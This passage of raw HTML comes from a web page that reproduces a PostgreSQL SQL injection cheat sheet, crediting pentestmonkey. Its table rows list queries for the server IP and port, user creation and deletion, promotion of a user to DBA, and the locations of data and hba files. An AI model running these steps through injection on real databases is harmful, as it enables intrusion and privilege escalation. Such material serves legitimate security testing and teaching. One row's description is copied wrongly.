solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT inet_server_addr(); ― returns db server IP address (or null if using local connection)<br>SELECT inet_server_port(); ― returns db server IP address (or null if using local connection)</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Create Users</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >CREATE USER test1 PASSWORD ‘pass1′; ― priv<br>CREATE USER test1 PASSWORD ‘pass1′ CREATEUSER; ― priv, grant some privs at the same time</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Drop Users</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >DROP USER test1; ― priv</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Make User DBA</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >ALTER USER test1 CREATEUSER CREATEDB; ― priv</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >&nbsp;Location of DB files</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT current_setting(‘data_directory’); ― priv<br>SELECT current_setting(‘hba_file’); ― priv</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Default/System Databases</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >template0<br>template1</td></tr></table></div><div><br></div>【参考】<wbr><div><a rel="nofollow" href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet"  >http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet</a></div></div>
	</div>
</div>
</body>
</html>